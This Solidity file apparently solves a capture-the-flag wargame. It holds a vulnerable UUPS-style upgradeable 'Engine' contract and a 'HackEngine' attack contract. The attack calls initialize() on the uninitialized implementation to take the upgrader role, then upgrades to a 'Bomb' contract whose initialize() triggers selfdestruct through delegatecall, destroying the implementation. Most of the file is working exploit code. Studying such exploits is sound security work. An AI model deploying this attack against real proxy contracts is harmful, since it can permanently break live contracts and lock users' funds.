// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/proxy/Initializable.sol";

// original Engine address
contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address public upgrader;
    uint256 public horsePower;
    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable
    {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data)
        internal
    {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(
            Address.isContract(newImplementation),
            "ERC1967: new implementation is not a contract"
        );

        AddressSlot storage r;
        assembly {
            r.slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}

contract HackEngine {
    Engine public originalContract = Engine(0x00);
    event logEvent(bool, bytes);

    function attackEngine() external {
        (bool success, bytes memory data) = address(originalContract).call(
            abi.encodeWithSignature("initialize()")
        );
        emit logEvent(success, data);
    }

    function destroyWithBomb() external {
        // pass in a bomb which blows up when initialize is called
        Bomb bomb = new Bomb();

        (bool success, bytes memory data) = address(originalContract).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(bomb),
                abi.encodeWithSignature("initialize()")
            )
        );
        emit logEvent(success, data);
    }
}

contract Bomb {
    function initialize() external {
        selfdestruct(msg.sender);
    }
}
